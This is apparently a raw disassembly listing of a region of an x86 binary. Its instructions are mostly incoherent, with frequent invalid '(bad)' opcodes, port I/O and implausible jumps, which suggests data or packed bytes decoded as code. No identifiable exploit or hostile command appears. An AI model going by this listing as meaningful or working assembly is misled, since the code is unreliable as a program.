  417c8e:	mov    ch,0x96
  417c90:	dec    ebx
  417c91:	push   ebx
  417c92:	stos   DWORD PTR es:[edi],eax
  417c93:	aam    0x4a
  417c95:	in     al,dx
  417c96:	test   ah,0x4c
  417c99:	sbb    BYTE PTR [ebx-0x48],cl
  417c9c:	in     al,0x45
  417c9e:	adc    BYTE PTR [esi+0x77ed4fb0],0x2a
  417ca5:	lods   al,BYTE PTR ds:[esi]
  417ca6:	cmp    esp,esi
  417ca8:	outs   dx,DWORD PTR ds:[esi]
  417ca9:	out    0xa3,al
  417cab:	das    
  417cac:	fwait
  417cad:	int    0xf9
  417caf:	sub    al,0x9b
  417cb1:	dec    eax
  417cb2:	adc    al,0xf3
  417cb4:	cmc    
  417cb5:	enter  0x6023,0xfb
  417cb9:	rol    DWORD PTR [eax-0x39b01647],cl
  417cbf:	xor    edi,edx
  417cc1:	xchg   ebp,eax
  417cc2:	inc    ebp
  417cc3:	ffreep st(5)
  417cc5:	test   eax,0xcb0debf5
  417cca:	mov    ds:0x2ae03ef2,al
  417ccf:	cs test al,0x49
  417cd2:	mov    esp,DWORD PTR [ebx+0x5ea0fef1]
  417cd8:	icebp  
  417cd9:	or     eax,DWORD PTR [ebp+0xf297d18]
  417cdf:	sbb    cl,BYTE PTR [esi+0x67]
  417ce2:	ds mov bh,0x42
  417ce5:	icebp  
  417ce6:	xchg   BYTE PTR [edx+0x4a940275],al
  417cec:	fisttp QWORD PTR [esi-0x2e]
  417cef:	inc    esp
  417cf0:	or     al,0x8c
  417cf2:	xchg   edi,eax
  417cf3:	sbb    al,0xab
  417cf5:	sbb    edx,DWORD PTR [edx]
  417cf7:	cs scas eax,DWORD PTR es:[edi]
  417cf9:	dec    edx
  417cfa:	jno    0x417d3c
  417cfc:	dec    esp
  417cfd:	xchg   BYTE PTR [ebx],cl
  417cff:	jl     0x417d2d
  417d01:	sbb    eax,DWORD PTR ds:0x89ff482b
  417d07:	adc    cl,dl
  417d09:	into   
  417d0a:	xor    al,0x11
  417d0c:	add    esi,esi
  417d0e:	int3   
  417d0f:	and    esp,0x7a
  417d12:	inc    esi
  417d13:	cmp    BYTE PTR [edx-0x3371f36c],bh
  417d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d1a:	test   BYTE PTR ds:0x7c36deb9,bl
  417d20:	pop    eax
  417d21:	ins    DWORD PTR es:[edi],dx
  417d22:	dec    esi
  417d23:	sub    dl,BYTE PTR [edi-0x6fc1a4e5]
  417d29:	mov    al,0x30
  417d2b:	sub    edx,DWORD PTR [eax+eax*8-0x27aedc82]
  417d32:	lods   al,BYTE PTR ds:[esi]
  417d33:	icebp  
  417d34:	dec    ebx
  417d35:	xor    DWORD PTR [esi-0x3b],ebx
  417d38:	bound  ecx,QWORD PTR [edi+0x6b2f471d]
  417d3e:	jmp    0xaca62351
  417d43:	mov    edx,0xc5cd601d
  417d48:	sbb    BYTE PTR [esi+0x31a6b3b1],bh
  417d4e:	mov    ah,BYTE PTR [ebp+0xc]
  417d51:	mov    edx,0x5ad25eb5
  417d56:	mov    ds:0x1888ca88,eax
  417d5b:	bound  eax,QWORD PTR [edx]
  417d5d:	rol    DWORD PTR [ecx],0xd4
  417d60:	push   ds
  417d61:	jns    0x417d15
  417d63:	mov    ah,0xce
  417d65:	clc    
  417d66:	in     eax,0x21
  417d68:	fild   WORD PTR [eax]
  417d6a:	mov    BYTE PTR [eax-0x663317b],al
  417d70:	mov    bl,0x9b
  417d72:	mov    bh,0x7b
  417d74:	pop    edx
  417d75:	push   0xb541d29b
  417d7a:	addr16 jo 0x417d22
  417d7d:	adc    DWORD PTR [ebx],eax
  417d7f:	lods   al,BYTE PTR ds:[esi]
  417d80:	sahf   
  417d81:	(bad)  
  417d82:	imul   BYTE PTR [edx+0x23]
  417d85:	je     0x417df2
  417d87:	imul   ecx,DWORD PTR [edx+0x7325cc75],0xfffffffa
  417d8e:	imul   eax,esi,0x7e
  417d91:	push   ds
  417d92:	div    DWORD PTR [eax]
  417d94:	inc    esp
  417d95:	shr    al,cl
  417d97:	jno    0x417df5
  417d99:	test   DWORD PTR [ebx],0x5328a7c9
  417d9f:	xchg   ebp,eax
  417da0:	pusha  
  417da1:	push   ds
  417da2:	fidiv  WORD PTR [ecx-0x56]
  417da5:	inc    eax
  417da6:	or     al,ch
  417da8:	xor    BYTE PTR [edx+ecx*8-0x52],dh
  417dac:	bound  edi,QWORD PTR [edx+0x18c6460]
  417db2:	mov    DWORD PTR ss:[ecx-0x2257e903],eax
  417db9:	aad    0x7e
  417dbb:	loope  0x417de6
  417dbd:	mov    ebx,DWORD PTR [edi-0x67]
  417dc0:	cdq    
  417dc1:	lods   eax,DWORD PTR ds:[esi]
  417dc2:	je     0x417ddd
  417dc4:	sub    eax,0x54023b93
  417dc9:	or     eax,0xdb72beb
  417dce:	shr    BYTE PTR [ecx-0x4a],1
  417dd1:	cli    
  417dd2:	jp     0x417de7
  417dd4:	cld    
  417dd5:	mov    BYTE PTR [ecx+edi*2-0x43],al
  417dd9:	xchg   edx,eax
  417dda:	xchg   ecx,eax
  417ddb:	pop    ss
  417ddc:	outs   dx,BYTE PTR ds:[esi]
  417ddd:	mov    eax,ds:0xff57ecf4
  417de2:	cmp    BYTE PTR [ecx+0x7d],al
  417de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de6:	cmp    BYTE PTR [esi+0x2d],dl
  417de9:	or     BYTE PTR [edx],bl
  417deb:	icebp  
  417dec:	push   0xffffffba
  417dee:	mov    DWORD PTR [ebp+0x21574a7],edi
  417df4:	xchg   esp,eax
  417df5:	lds    esp,FWORD PTR [ebx-0x2a]
  417df8:	jbe    0x417e57
  417dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dfb:	xlat   BYTE PTR ds:[ebx]
  417dfc:	outs   dx,BYTE PTR ds:[esi]
  417dfd:	jno    0x417dca
  417dff:	in     eax,dx
  417e00:	dec    edi
  417e01:	lahf   
  417e02:	dec    eax
  417e03:	call   0xd801:0xf72359c2
  417e0a:	dec    eax
  417e0b:	push   0x10fe92a3
  417e10:	out    dx,al
  417e11:	jo     0x417dbf
  417e13:	mov    BYTE PTR [edi+0x2a],dl
  417e16:	mov    ah,0xe5
  417e18:	jno    0x417e3e
  417e1a:	sub    al,0x3f
  417e1c:	pop    edi
  417e1d:	adc    ecx,DWORD PTR [ebx+0x6e]
  417e20:	(bad)  
  417e22:	xchg   ebx,eax
  417e23:	ins    DWORD PTR es:[edi],dx
  417e24:	lahf   
  417e25:	inc    eax
  417e26:	enter  0x61f2,0x79
  417e2a:	sahf   
  417e2b:	out    dx,al
  417e2c:	into   
  417e2d:	add    eax,0xe8388866
  417e32:	cli    
  417e33:	push   ebx
  417e34:	and    eax,0x883b232
  417e39:	or     BYTE PTR [esi],bh
  417e3b:	and    ebx,ecx
  417e3d:	int3   
  417e3e:	mov    BYTE PTR [edi],0x7b
  417e41:	xchg   ebx,eax
  417e42:	stos   DWORD PTR es:[edi],eax
  417e43:	mov    ds:0xeafb809c,eax
  417e48:	pop    es
  417e49:	es xchg edi,eax
  417e4b:	cwde   
  417e4c:	sub    bl,BYTE PTR [edx-0x77]
  417e4f:	add    BYTE PTR [edx+0x71],0x39
  417e53:	lods   al,BYTE PTR ds:[esi]
  417e54:	xor    DWORD PTR ss:[edx-0x65],ebx
  417e58:	sti    
  417e59:	mov    ch,BYTE PTR [edi]
  417e5b:	rol    DWORD PTR [esi+0xd],cl
  417e5e:	sti    
  417e5f:	mov    eax,0x4ae4049b
  417e64:	shr    DWORD PTR [ecx+eiz*1],cl
  417e67:	leave  
  417e68:	mov    edx,?
  417e6a:	xchg   DWORD PTR [esi-0x35bec67c],eax
  417e70:	in     eax,0xd2
  417e72:	ficom  DWORD PTR [ebx]
  417e74:	jne    0x417dfb
  417e76:	shl    DWORD PTR [esp+edx*1],1
  417e79:	mov    WORD PTR [ebp-0x635cb087],ds
  417e7f:	xor    al,0xf9
  417e81:	cmp    ecx,DWORD PTR [ecx+0x19aa576]
  417e87:	(bad)
  417e8b:	out    dx,eax
  417e8c:	push   0x79
  417e8e:	sub    BYTE PTR [edi],al
  417e90:	mov    esi,0xab19c4c9
  417e95:	add    al,bh
  417e97:	push   es
  417e98:	or     BYTE PTR [ebx+0x12c8442c],ah
  417e9e:	cmp    BYTE PTR [esi],dh
  417ea0:	paddsb mm3,QWORD PTR ds:0x67c51bec
  417ea7:	ret    
  417ea8:	pushf  
  417ea9:	adc    ebx,DWORD PTR [ecx+0x15]
  417eac:	not    BYTE PTR [edx]
  417eae:	cwde   
  417eaf:	retf   0xaf53
  417eb2:	in     eax,0xe0
  417eb4:	enter  0xa8ff,0x34
  417eb8:	push   ds
  417eb9:	inc    ecx
  417eba:	and    ebx,DWORD PTR [eax]
  417ebc:	loope  0x417edd
  417ebe:	nop
  417ebf:	sub    eax,0x242b7fd8
  417ec4:	sar    BYTE PTR [ebp+0x4e8c102e],cl
  417eca:	in     eax,0xcc
  417ecc:	sbb    DWORD PTR [edx+0x25],0x5305bab3
  417ed3:	(bad)  
  417ed4:	sti    
  417ed5:	add    eax,0xffd22e71
  417eda:	(bad)  
  417edb:	jg     0x417ebb
  417edd:	mov    eax,ds:0x405ebb03
  417ee2:	push   0xffffffb1
  417ee4:	repz xor BYTE PTR [edi-0x38cebde9],ch
  417eeb:	mov    ch,0xfb
  417eed:	or     ebx,eax
  417eef:	mov    cl,0x7f
  417ef1:	test   eax,0x65a9edf4
  417ef6:	cwde   
  417ef7:	add    al,0x17
  417ef9:	int    0x2c
  417efb:	inc    eax
  417efc:	daa    
  417efd:	xchg   edi,eax
  417efe:	leave  
  417eff:	cwde   
  417f00:	jmp    0xb3e090b5
  417f05:	aad    0xdb
  417f07:	push   0x6758484b
  417f0c:	xchg   ecx,eax
  417f0d:	fwait
  417f0e:	shr    BYTE PTR [esi],cl
  417f10:	jo     0x417f77
  417f12:	scas   eax,DWORD PTR es:[edi]
  417f13:	les    eax,FWORD PTR ds:0xba6f8453
  417f19:	push   edi
  417f1a:	mov    dh,0x37
  417f1c:	and    edi,DWORD PTR [esi-0x6]
  417f1f:	sub    bl,dh
  417f21:	inc    esp
  417f22:	inc    edi
  417f23:	lods   al,BYTE PTR ds:[esi]
  417f24:	sub    BYTE PTR [esi-0x57],dl
  417f27:	lea    esp,[ecx+0x504a1ea0]
  417f2d:	mov    cl,0xbc
  417f2f:	sbb    eax,0x1a5483f7
  417f34:	dec    edi
  417f35:	pop    ecx
  417f36:	imul   ebx,DWORD PTR [eax],0x2c
  417f39:	out    dx,al
  417f3a:	test   eax,0xed671fb5
  417f3f:	mov    ds:0x97432479,al
  417f44:	or     al,BYTE PTR [edi-0x3f]
  417f47:	retf   0x735c
  417f4a:	adc    al,0x71
  417f4c:	and    BYTE PTR [eax-0x5d],bl
  417f4f:	add    edi,DWORD PTR [ecx]
  417f51:	das    
  417f52:	test   BYTE PTR [eax+0x7d],0xe1
  417f56:	xchg   esp,eax
  417f57:	es mov ebx,0x90b43ba5
  417f5d:	xchg   ecx,eax
  417f5e:	push   ss
  417f5f:	iret   
  417f60:	push   ecx
  417f61:	repz pop eax
  417f63:	mov    edi,esi
  417f65:	paddsb mm3,QWORD PTR [esi+0x445e9a8e]
  417f6c:	ret    0xc873
  417f6f:	shl    ch,0xb2
  417f72:	add    bl,BYTE PTR [edi+0x4ee3bdb3]
  417f78:	(bad)  
  417f79:	aam    0xce
  417f7b:	sub    al,0x25
  417f7d:	popf   
  417f7e:	mov    eax,ds:0xeb6029b8
  417f83:	or     edi,ebx
  417f85:	aam    0x54
  417f87:	loop   0x417f63
  417f89:	setne  bl
  417f8c:	mov    esp,0x874e8c2c
  417f91:	out    dx,eax
  417f92:	lods   eax,DWORD PTR ds:[esi]
  417f93:	cwde   
  417f94:	outs   dx,BYTE PTR ds:[esi]
  417f95:	fcmovbe st,st(7)
  417f97:	sar    dl,0xdd
  417f9a:	sub    eax,0x3a30012c
  417f9f:	mov    WORD PTR [ecx],gs
  417fa1:	mov    dh,0xda
  417fa3:	retf   0xe29d
  417fa6:	inc    esi
  417fa7:	cmc    
  417fa8:	aas    
  417fa9:	push   eax
  417faa:	pop    edx
  417fab:	dec    esi
  417fac:	jmp    0x418026
  417fae:	mov    ecx,0xddb4746e
  417fb3:	lds    esp,FWORD PTR [ebx+0x12]
  417fb6:	jmp    0xb78f17dc
  417fbb:	lods   eax,DWORD PTR ds:[esi]
  417fbc:	xchg   ebp,eax
  417fbd:	iret   
  417fbe:	mov    dh,BYTE PTR [eax-0x22]
  417fc1:	cdq    
  417fc2:	fxtract 
  417fc4:	xor    BYTE PTR [edi+edx*2+0x3433bbe1],bh
  417fcb:	mov    esp,0xab96f98a
  417fd0:	sub    BYTE PTR [esi+0x7fd437e2],al
  417fd6:	xor    BYTE PTR ds:0xb564cfba,ch
  417fdc:	xchg   ebp,eax
  417fdd:	mov    BYTE PTR [eax+0x2a],dh
  417fe0:	and    al,0xcd
  417fe2:	rcr    BYTE PTR [esi+ebp*4+0x6c102dd5],1
  417fe9:	arpl   bx,di
  417feb:	inc    eax
  417fec:	jmp    0x37d93152
  417ff1:	clc    
  417ff2:	lods   eax,DWORD PTR ds:[esi]
  417ff3:	push   cs
  417ff4:	sbb    eax,0xe5c269f2
  417ff9:	push   ss
  417ffa:	xor    bh,BYTE PTR [esi+edx*2-0x7b]
  417ffe:	js     0x41803b
  418000:	(bad)  
  418001:	mov    al,0xda
  418003:	je     0x417f92
  418005:	leave  
  418006:	cmp    bl,ch
  418008:	test   al,0xb0
  41800a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41800b:	inc    edi
  41800c:	rcr    DWORD PTR [ecx+0x34205aee],0x0
  418013:	sub    BYTE PTR [ebp+eiz*4+0x4d506e73],bl
  41801a:	shr    BYTE PTR [ebp-0x3f],cl
  41801d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801e:	jmp    0x654e:0x482c3ec0
  418025:	sbb    BYTE PTR [edx-0x5ece0e70],al
  41802b:	gs mov ah,0x4b
  41802e:	repz sahf 
  418030:	xchg   edi,eax
  418031:	mov    ds:0xd5549de6,al
  418036:	mov    edi,0x5092de4f
  41803b:	sbb    BYTE PTR ds:0xcc5dce0f,cl
  418041:	mov    eax,0x31c0dabe
  418046:	xchg   ecx,eax
  418047:	jecxz  0x41805f
  418049:	test   BYTE PTR [edx-0x7323e1b0],bh
  41804f:	inc    esi
  418051:	push   esi
  418052:	dec    edx
  418053:	arpl   WORD PTR [edi-0x72dacaf6],cx
  418059:	push   eax
  41805a:	ss jno 0x418035
  41805d:	mov    ds:0xa37f5afb,eax
  418062:	std    
  418063:	xchg   ebx,eax
  418064:	jne    0x418036
  418066:	or     bl,dl
  418068:	addr16 mov al,ds:0xbec6
  41806c:	sar    BYTE PTR [edi+0x6],1
  41806f:	sbb    dh,BYTE PTR [edi-0x10]
  418072:	retf   
  418073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418074:	mov    ch,0x36
  418076:	xor    DWORD PTR [eax+0x22bd630],ebp
  41807c:	and    eax,0x6187bd46
  418081:	push   ecx
  418082:	dec    ebp
  418083:	mov    eax,0xf169ad1e
  418088:	aaa    
  418089:	jle    0x418087
  41808b:	mov    BYTE PTR [edx],bh
  41808d:	mov    ah,0xdf
  41808f:	cmp    DWORD PTR [edx+0x1e],eax
  418092:	mov    cs,WORD PTR [edx+0x70]
  418095:	sbb    cl,BYTE PTR [edi+0x4910af16]
  41809b:	clc    
  41809c:	loope  0x4180d0
  41809e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809f:	add    al,ah
  4180a1:	dec    ecx
  4180a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a3:	popf   
  4180a4:	sbb    BYTE PTR ds:0xeb859a51,ch
  4180aa:	dec    esi
  4180ab:	retf   
  4180ac:	retf   0xc4fb
  4180af:	arpl   WORD PTR [esi-0x497daca2],cx
  4180b5:	mov    al,0xaa
  4180b7:	push   edx
  4180b8:	push   eax
  4180b9:	cld    
  4180ba:	repnz pop ebp
  4180bc:	jb     0x41813a
  4180be:	shl    esp,0x27
  4180c1:	pop    edx
  4180c2:	ret    
  4180c3:	pop    edx
  4180c4:	add    eax,esp
  4180c6:	xchg   DWORD PTR [edi-0x7228fb96],eax
  4180cc:	fsub   st(0),st
  4180ce:	not    DWORD PTR ds:0xf09e9283
  4180d4:	dec    eax
  4180d5:	add    eax,0xe032bdab
  4180da:	inc    ebp
  4180db:	push   ebx
  4180dc:	mov    al,0x31
  4180de:	or     BYTE PTR [eax-0x66217fd1],cl
  4180e4:	xor    DWORD PTR [eax+0x21f8c4ba],ebp
  4180ea:	stos   BYTE PTR es:[edi],al
  4180eb:	mov    WORD PTR [edx-0x76e6bc13],fs
  4180f1:	nop
  4180f2:	mov    ebx,0xf13dd262
  4180f7:	test   BYTE PTR [edi],0x33
  4180fa:	jb     0x418124
  4180fc:	out    dx,al
  4180fd:	xchg   ebx,eax
  4180fe:	aam    0xb4
  418100:	add    al,0xe6
  418102:	in     al,0xd8
  418104:	aas    
  418105:	mov    ah,0x34
  418107:	mov    dl,0xee
  418109:	mov    dh,0xa
  41810b:	imul   esp,esi,0x5a
  41810e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41810f:	pop    edx
  418110:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418112:	adc    al,BYTE PTR [esi+0x10]
  418115:	inc    ebp
  418116:	or     DWORD PTR [ecx-0x68],ecx
  418119:	(bad)  
  41811a:	lods   eax,DWORD PTR ds:[esi]
  41811b:	adc    DWORD PTR [edi],esp
  41811d:	mov    WORD PTR [edi],?
  41811f:	adc    ecx,DWORD PTR [ecx]
  418121:	mov    ah,0x91
  418123:	mov    ebp,0x5723b55c
  418128:	mov    bh,0xa4
  41812a:	jl     0x41814d
  41812c:	fistp  QWORD PTR [ecx+ebp*8+0x2562b6bb]
  418133:	loop   0x4180dd
  418135:	xor    cl,BYTE PTR [edi+0x4006dacd]
  41813b:	push   edi
  41813c:	adc    eax,0x5a664bbb
  418141:	addr16 out dx,eax
  418143:	mov    al,ds:0xdb8bfe37
  418148:	pop    es
  418149:	dec    ebp
  41814a:	leave  
  41814b:	pop    esi
  41814c:	sbb    ah,ch
  41814e:	inc    ecx
  41814f:	nop
  418150:	jmp    0x5e36:0x393bb0cc
  418157:	pop    edx
  418158:	push   ecx
  418159:	push   edx
  41815a:	push   eax
  41815b:	push   es
  41815c:	daa    
  41815d:	cld    
  41815e:	enter  0xd618,0x6f
  418162:	(bad)  
  418164:	dec    esp
  418165:	ins    DWORD PTR es:[edi],dx
  418166:	pop    ss
  418167:	adc    bl,BYTE PTR [esp+ebp*1]
  41816a:	mov    esp,ecx
  41816c:	cdq    
  41816d:	jmp    0x5232b9e0
  418172:	(bad)  [eax+edx*1+0x7b]
  418176:	jle    0x4181bd
  418178:	das    
  418179:	push   ss
  41817a:	push   ecx
  41817b:	and    al,0x39
  41817d:	sub    al,0x84
  41817f:	fwait
  418180:	out    0x41,al
  418182:	das    
  418183:	(bad)  
  418184:	repz cdq 
  418186:	push   cs
  418187:	mov    dh,0x1e
  418189:	es lahf 
  41818b:	pop    ebp
  41818c:	stos   BYTE PTR es:[edi],al
  41818d:	std    
  41818e:	int    0xaf
  418190:	mov    ebp,esi
  418192:	mov    ds:0xec27c49b,al
  418197:	push   ecx
  418198:	inc    ecx
  418199:	scas   eax,DWORD PTR es:[edi]
  41819a:	ds int 0x57
  41819d:	mov    ?,WORD PTR [ebx+0x7866b7af]
  4181a3:	aam    0x79
  4181a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181a6:	arpl   WORD PTR [ecx+eiz*4-0x2db57ec6],bx
  4181ad:	xchg   ebx,eax
  4181ae:	(bad)  [eax+ebx*4+0x69]
  4181b2:	out    dx,eax
  4181b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b4:	stc    
  4181b5:	pusha  
  4181b6:	pop    eax
  4181b7:	inc    edi
  4181b8:	(bad)  
  4181ba:	stos   DWORD PTR es:[edi],eax
  4181bb:	cld    
  4181bc:	fistp  WORD PTR [edi-0x9]
  4181bf:	es je  0x4181fb
  4181c2:	sub    al,0x38
  4181c4:	(bad)  
  4181c5:	jo     0x418240
  4181c7:	fist   WORD PTR [ecx]
  4181c9:	push   esi
  4181ca:	xlat   BYTE PTR ds:[ebx]
  4181cb:	jne    0x4181dc
  4181cd:	mov    ebp,DWORD PTR [ecx-0x2d5080b7]
  4181d3:	xchg   edi,eax
  4181d4:	push   0x20167c88
  4181d9:	jae    0x418178
  4181db:	mov    fs:0x4f625b0f,al
  4181e1:	or     al,0x95
  4181e3:	mov    WORD PTR [ecx+0x474ca696],cs
  4181e9:	cld    
  4181ea:	sbb    al,0x71
  4181ec:	(bad)  
  4181ed:	push   ds
  4181ee:	xchg   edx,eax
  4181ef:	or     BYTE PTR [ecx+0x3064e5ca],bl
  4181f5:	push   es
  4181f6:	inc    ecx
  4181f7:	and    DWORD PTR [edi+0x5649a518],esp
  4181fd:	inc    ebp
  4181fe:	jnp    0x418272
  418200:	inc    esp
  418201:	ins    BYTE PTR es:[edi],dx
  418202:	push   ebx
  418203:	push   ecx
  418204:	mov    ch,0xd5
  418206:	lods   eax,DWORD PTR ds:[esi]
  418207:	out    0x61,eax
  418209:	std    
  41820a:	xchg   edi,eax
  41820b:	cmp    al,0x29
  41820d:	je     0x4181d0
  41820f:	mov    dh,0xd7
  418211:	add    ebx,esp
  418213:	inc    esi
  418214:	dec    ecx
  418215:	mov    DWORD PTR [eax+0x4fcd7fab],ecx
  41821b:	jge    0x418289
  41821d:	mov    al,dh
  41821f:	sub    eax,0x8f20f46d
  418224:	rcr    BYTE PTR [ebp-0x18675f29],0xde
  41822b:	push   esp
  41822c:	xchg   ebp,eax
  41822d:	lahf   
  41822e:	iret   
  41822f:	mov    ds:0x5aaed53b,al
  418234:	xor    DWORD PTR [ecx+0x74f6d9ac],edx
  41823a:	arpl   WORD PTR [ebx+0x5bee5bda],sp
  418240:	les    esi,FWORD PTR [edx]
  418242:	mov    ds:0x7a1090e1,eax
  418247:	arpl   WORD PTR [ecx-0x25fe43cc],si
  41824d:	scas   al,BYTE PTR es:[edi]
  41824e:	cwde   
  41824f:	jle    0x4182b4
  418251:	outs   dx,DWORD PTR ds:[esi]
  418252:	fbstp  TBYTE PTR [ebx+0x7f8a2457]
  418258:	aam    0x17
  41825a:	sub    ebx,ebx
  41825c:	repnz or eax,0x6e028cf5
  418262:	iret   
  418263:	lahf   
  418264:	cwde   
  418265:	dec    ebx
  418266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418267:	push   es
  418268:	idiv   BYTE PTR [edi]
  41826a:	mov    al,ds:0xaa4549d3
  41826f:	mov    ?,WORD PTR [ebp+0x3a]
  418272:	test   BYTE PTR [ecx-0x52],bl
  418275:	mov    ds:0x4b8dfa60,al
  41827a:	repnz pop DWORD PTR [edx]
  41827d:	imul   edi,DWORD PTR [esi-0x41],0x18
  418281:	(bad)  
  418282:	mov    ecx,0x2359ce9e
  418287:	jno    0x4182da
  418289:	ret    
  41828a:	sahf   
  41828b:	imul   ebx,DWORD PTR [ecx-0x7e479361],0x40
  418292:	mov    edx,0x46e4d649
  418297:	not    edi
  418299:	add    BYTE PTR [ebx-0x78c2fbc3],cl
  41829f:	cs aas 
  4182a1:	les    eax,FWORD PTR ds:0x843b7745
  4182a7:	mov    dl,0x1a
  4182a9:	mov    al,ds:0xf3aa651d
  4182ae:	stos   BYTE PTR es:[edi],al
  4182af:	gs xchg edi,eax
  4182b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182b2:	mov    edx,0xa63ae716
  4182b7:	(bad)  [ecx+0x172f274e]
  4182bd:	sbb    al,0x2
  4182bf:	cmp    dl,BYTE PTR [edx-0x56]
  4182c2:	sar    DWORD PTR [esi],1
  4182c4:	and    eax,0x5b2b0753
  4182c9:	ror    DWORD PTR [edx],cl
  4182cb:	sbb    esp,DWORD PTR [ebx]
  4182cd:	pusha  
  4182ce:	call   0x66149bae
  4182d3:	arpl   WORD PTR [edi],bp
  4182d5:	les    ebx,FWORD PTR [eax+0x4d2f7052]
  4182db:	out    0xaa,eax
  4182dd:	add    al,0xc1
  4182df:	daa    
  4182e0:	pop    ebx
  4182e1:	inc    ebp
  4182e2:	pop    ds
  4182e3:	sub    eax,0x9a3404ac
  4182e8:	fnstsw WORD PTR [edx+0x11a0b19b]
  4182ee:	(bad)  
  4182f0:	cmp    al,0x73
  4182f2:	repz mov ebx,0x2e234d52
  4182f8:	jb     0x4182ba
  4182fa:	fcom   QWORD PTR [edx+0x73]
  4182fd:	leave  
  4182fe:	jmp    0x511fd8ff
  418303:	xchg   esi,eax
  418304:	jmp    0xe323:0x9fc45390
  41830b:	fidivr DWORD PTR [esi+edx*4+0x1f]
  41830f:	jle    0x418347
  418311:	add    al,0x9a
  418313:	dec    ecx
  418314:	sub    dh,BYTE PTR [ecx-0x7d]
  418317:	jle    0x41835d
  418319:	aas    
  41831a:	iret   
  41831b:	push   ebp
  41831c:	sub    al,0xd1
  41831e:	imul   ebx,DWORD PTR [esi],0x3aaf2951
  418324:	inc    edi
  418325:	jmp    0x7c9d74a
  41832a:	aad    0xf0
  41832c:	mov    bl,0xaa
  41832e:	(bad)  
  418330:	fwait
  418331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418332:	enter  0xdb7b,0xe
  418336:	sub    eax,0x92e8a868
  41833b:	ss dec eax
  41833d:	mov    es,WORD PTR [edx]
  41833f:	cmp    al,0x85
  418341:	inc    edx
  418342:	(bad)  
  418343:	jl     0x4182d7
  418345:	jb     0x4182f0
  418347:	addr16 add al,0xe7
  41834a:	lods   eax,DWORD PTR ds:[esi]
  41834b:	les    eax,FWORD PTR [edi+edi*8+0x6c]
  41834f:	pushf  
  418350:	inc    esi
  418351:	pop    ebp
  418352:	mov    eax,0xaea336c2
  418357:	push   ecx
  418358:	sbb    dh,al
  41835a:	ja     0x4182ff
  41835c:	cmp    al,0x4a
  41835e:	mov    cl,0x70
  418360:	jecxz  0x41839c
  418362:	arpl   dx,dx
  418364:	xchg   edi,eax
  418365:	and    esi,DWORD PTR [ecx+0x2b]
  418368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418369:	(bad)  
  41836a:	sub    al,0xb5
  41836c:	stos   BYTE PTR es:[edi],al
  41836d:	inc    esi
  41836e:	pop    edx
  41836f:	push   ebx
  418370:	repz dec ecx
  418372:	aam    0x80
  418374:	(bad)  
  418375:	stos   DWORD PTR es:[edi],eax
  418376:	jmp    0x418349
  418378:	out    0xb1,eax
  41837a:	inc    ebx
  41837b:	and    BYTE PTR [edi-0x754ade5e],ah
  418381:	jle    0x4183b0
  418383:	sub    ah,bh
  418385:	pop    esp
  418386:	ficom  WORD PTR [esi+0x15acb48c]
  41838c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41838d:	icebp  
  41838e:	mov    bh,0xb2
  418390:	cwde   
  418391:	cld    
  418392:	cmp    BYTE PTR ss:[edx+0x47],al
  418396:	xchg   ebx,eax
  418397:	inc    esi
  418398:	frstor [edx]
  41839a:	xchg   BYTE PTR [esi-0x218f1cab],ah
  4183a0:	loope  0x4183a0
  4183a2:	jo     0x418349
  4183a4:	imul   edx,DWORD PTR [edx],0xffffff92
  4183a7:	jae    0x4183f3
  4183a9:	add    ah,cl
  4183ab:	(bad)  
  4183ac:	or     esi,DWORD PTR [esi+0x34]
  4183af:	push   ecx
  4183b0:	xchg   ebp,eax
  4183b1:	popf   
  4183b2:	xor    DWORD PTR [ebp-0x39d40528],0x59
  4183b9:	lods   eax,DWORD PTR ds:[esi]
  4183ba:	sbb    eax,DWORD PTR [edx]
  4183bc:	mov    al,ds:0xb3f586b5
  4183c1:	sub    eax,0x68cc9adc
  4183c6:	pop    esi
  4183c7:	pop    ss
  4183c8:	sar    DWORD PTR [ecx+ecx*2],1
  4183cb:	scas   al,BYTE PTR es:[edi]
  4183cc:	mov    esp,0xb5e988f1
  4183d1:	jmp    0x993d3f63
  4183d6:	cmp    bh,BYTE PTR [esi+0x72214a58]
  4183dc:	ins    DWORD PTR es:[edi],dx
  4183dd:	sub    esi,ebx
  4183df:	mov    ebx,ecx
  4183e1:	mul    DWORD PTR [edi]
  4183e3:	loop   0x4183b8
  4183e5:	pusha  
  4183e6:	inc    esp
  4183e7:	push   edx
  4183e8:	pop    esi
  4183e9:	mov    bl,0x4b
  4183eb:	imul   esi,edx,0xf4b15bc9
  4183f1:	sar    BYTE PTR [ebx],1
  4183f3:	aaa    
  4183f4:	(bad)  
  4183f6:	addr16 sbb al,0xca
  4183f9:	or     dl,BYTE PTR [esi]
  4183fb:	ss pop ds
  4183fd:	mov    ecx,fs
  4183ff:	push   esp
  418400:	daa    
  418401:	sbb    BYTE PTR [esi],cl
  418403:	jl     0x4183a4
  418405:	adc    edi,0x3b
  418408:	shl    DWORD PTR [ebp+0x10],0x27
  41840c:	jl     0x4183e1
  41840e:	sub    esp,DWORD PTR [esi+esi*4]
  418411:	or     eax,0xc0efb90d
  418416:	xchg   ebp,eax
  418417:	ret    
  418418:	cmp    edx,ebx
  41841a:	sti    
  41841b:	clc    
  41841c:	out    dx,al
  41841d:	cmp    al,0x1d
  41841f:	inc    edi
  418420:	fcomp  QWORD PTR [edi+0x4f]
  418423:	mov    ecx,0x6662b9e0
  418428:	mov    ds:0xef8cfeb2,eax
  41842d:	jg     0x4184a6
  41842f:	cmc    
